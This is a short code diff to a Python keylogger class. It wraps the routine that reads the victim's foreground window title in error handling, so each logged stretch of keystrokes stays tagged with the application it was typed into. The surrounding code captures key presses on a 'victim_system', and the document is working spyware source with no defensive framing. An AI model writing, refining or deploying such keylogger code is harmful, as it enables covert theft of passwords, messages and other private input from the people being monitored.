@@ -71,12 +71,15 @@ class Keylogger:
     def process_key_press(self, key):
         current_key = ""
         
-        if self.victim_system == 'Windows':        
-            CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())
-        
-            if self.lastWindow != CurrentWindowName:
-                self.lastWindow = CurrentWindowName
-                current_key = f"\n\n[OnWard Data Entered In : {CurrentWindowName}]\n"
+        if self.victim_system == 'Windows':
+            try:
+                CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())
+
+                if self.lastWindow != CurrentWindowName:
+                    self.lastWindow = CurrentWindowName
+                    current_key = f"\n\n[OnWard Data Entered In : {CurrentWindowName}]\n"
+            except Exception:
+                print("[!] Failed to Execute \"Log Data Distinguisher Function\" ")
             
         try:
             current_key += str(key.char)
